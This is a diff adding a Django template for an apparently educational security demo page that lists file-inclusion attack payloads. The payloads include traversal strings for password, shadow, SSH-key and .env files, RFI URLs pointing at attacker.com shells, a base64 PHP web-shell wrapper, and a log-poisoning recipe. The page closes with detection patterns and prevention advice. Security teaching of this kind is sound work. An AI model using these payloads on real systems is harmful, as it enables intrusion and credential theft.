@@ -1,0 +1,214 @@
+{% extends 'viewer/base.html' %}
+
+{% block title %}Attack Payloads - {{ block.super }}{% endblock %}
+
+{% block content %}
+<div class="hero">
+    <h1>💣 Attack Payloads Reference</h1>
+    <div class="alert alert-warning">
+        <strong>⚠️ Educational Purpose:</strong> These payloads are for understanding attack techniques and building better defenses.
+    </div>
+</div>
+
+<div class="hero">
+    <h2>📂 Local File Inclusion (LFI) Payloads</h2>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Basic Directory Traversal</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace;">
+            <div style="margin: 0.5rem 0;"><code>../../../etc/passwd</code></div>
+            <div style="margin: 0.5rem 0;"><code>..\\..\\..\\windows\\system32\\drivers\\etc\\hosts</code></div>
+            <div style="margin: 0.5rem 0;"><code>....//....//....//etc/passwd</code></div>
+            <div style="margin: 0.5rem 0;"><code>..%2F..%2F..%2Fetc%2Fpasswd</code></div>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Encoding Bypasses</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace;">
+            <div style="margin: 0.5rem 0;"><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></div>
+            <div style="margin: 0.5rem 0;"><code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</code></div>
+            <div style="margin: 0.5rem 0;"><code>..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</code></div>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Null Byte Injection (Legacy)</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace;">
+            <div style="margin: 0.5rem 0;"><code>../../../etc/passwd%00</code></div>
+            <div style="margin: 0.5rem 0;"><code>../../../etc/passwd%00.jpg</code></div>
+            <div style="margin: 0.5rem 0;"><code>../../../etc/passwd\x00</code></div>
+        </div>
+        <small style="color: #666;">Note: Null byte injection was fixed in PHP 5.3.4+</small>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Common Target Files</h3>
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+            
+            <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #dc3545;">
+                <h4>🐧 Linux/Unix</h4>
+                <div style="font-family: monospace; font-size: 0.9rem;">
+                    <div>/etc/passwd</div>
+                    <div>/etc/shadow</div>
+                    <div>/etc/hosts</div>
+                    <div>/var/log/apache2/access.log</div>
+                    <div>/proc/self/environ</div>
+                    <div>/home/user/.ssh/id_rsa</div>
+                </div>
+            </div>
+            
+            <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #dc3545;">
+                <h4>🏢 Windows</h4>
+                <div style="font-family: monospace; font-size: 0.9rem;">
+                    <div>C:\Windows\System32\drivers\etc\hosts</div>
+                    <div>C:\Windows\win.ini</div>
+                    <div>C:\Windows\system.ini</div>
+                    <div>C:\Windows\repair\SAM</div>
+                    <div>C:\Windows\Panther\unattend.xml</div>
+                </div>
+            </div>
+            
+            <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #dc3545;">
+                <h4>🌐 Web Applications</h4>
+                <div style="font-family: monospace; font-size: 0.9rem;">
+                    <div>../config.php</div>
+                    <div>../wp-config.php</div>
+                    <div>../database.yml</div>
+                    <div>../.env</div>
+                    <div>../settings.py</div>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🌐 Remote File Inclusion (RFI) Payloads</h2>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Basic RFI</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace;">
+            <div style="margin: 0.5rem 0;"><code>http://attacker.com/shell.php</code></div>
+            <div style="margin: 0.5rem 0;"><code>https://pastebin.com/raw/malicious_code</code></div>
+            <div style="margin: 0.5rem 0;"><code>ftp://attacker.com/backdoor.txt</code></div>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 PHP Wrappers</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace;">
+            <div style="margin: 0.5rem 0;"><code>php://input</code></div>
+            <div style="margin: 0.5rem 0;"><code>php://filter/convert.base64-encode/resource=index.php</code></div>
+            <div style="margin: 0.5rem 0;"><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</code></div>
+            <div style="margin: 0.5rem 0;"><code>expect://whoami</code></div>
+        </div>
+    </div>
+    
+    <div style="margin: 1rem 0;">
+        <h3>🔴 Log Poisoning</h3>
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd;">
+            <p><strong>Step 1:</strong> Poison the log file</p>
+            <div style="font-family: monospace; margin: 0.5rem 0;">
+                <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code>
+            </div>
+            <p><strong>Step 2:</strong> Include the poisoned log</p>
+            <div style="font-family: monospace; margin: 0.5rem 0;">
+                <code>../../../var/log/apache2/access.log&cmd=whoami</code>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🛡️ Detection and Prevention</h2>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #d4edda; padding: 1rem; border-radius: 5px; border: 1px solid #c3e6cb;">
+            <h3>🔍 Detection Patterns</h3>
+            <div style="font-family: monospace; font-size: 0.9rem;">
+                <div>• Contains ../</div>
+                <div>• Contains ..\</div>
+                <div>• Contains %2e%2e%2f</div>
+                <div>• Contains http://</div>
+                <div>• Contains php://</div>
+                <div>• Contains data://</div>
+                <div>• Contains null bytes</div>
+            </div>
+        </div>
+        
+        <div style="background-color: #d4edda; padding: 1rem; border-radius: 5px; border: 1px solid #c3e6cb;">
+            <h3>🔒 Prevention Methods</h3>
+            <div style="font-size: 0.9rem;">
+                <div>• Input validation & sanitization</div>
+                <div>• Whitelist allowed files</div>
+                <div>• Path canonicalization</div>
+                <div>• Disable dangerous functions</div>
+                <div>• Use basename() for filenames</div>
+                <div>• Implement proper access controls</div>
+                <div>• Regular security audits</div>
+            </div>
+        </div>
+        
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🧪 Testing Tools</h2>
+    
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #17a2b8;">
+            <h3>🔧 Manual Testing</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>Browser developer tools</li>
+                <li>curl command line</li>
+                <li>Postman/Insomnia</li>
+                <li>Custom scripts</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #17a2b8;">
+            <h3>🛠️ Automated Tools</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>Burp Suite</li>
+                <li>OWASP ZAP</li>
+                <li>Nikto</li>
+                <li>ffuf</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #17a2b8;">
+            <h3>📋 Payload Lists</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>SecLists</li>
+                <li>PayloadsAllTheThings</li>
+                <li>FuzzDB</li>
+                <li>OWASP Testing Guide</li>
+            </ul>
+        </div>
+        
+    </div>
+</div>
+
+<div class="hero">
+    <div class="alert alert-danger">
+        <h3>⚠️ Legal and Ethical Notice</h3>
+        <ul style="margin: 1rem 0; padding-left: 2rem;">
+            <li><strong>Only test on systems you own or have explicit permission to test</strong></li>
+            <li><strong>Never use these payloads maliciously</strong></li>
+            <li><strong>Follow responsible disclosure practices</strong></li>
+            <li><strong>Respect privacy and confidentiality</strong></li>
+            <li><strong>Use knowledge for defensive purposes only</strong></li>
+        </ul>
+    </div>
+</div>
+
+<div style="margin: 2rem 0; text-align: center;">
+    <a href="{% url 'rfi_demo' %}" class="btn">← RFI Demo</a>
+    <a href="{% url 'vulnerability_demo' %}" class="btn">Back to Demos</a>
+    <a href="{% url 'defense_mechanisms' %}" class="btn">Next: Defenses →</a>
+</div>
+{% endblock %}
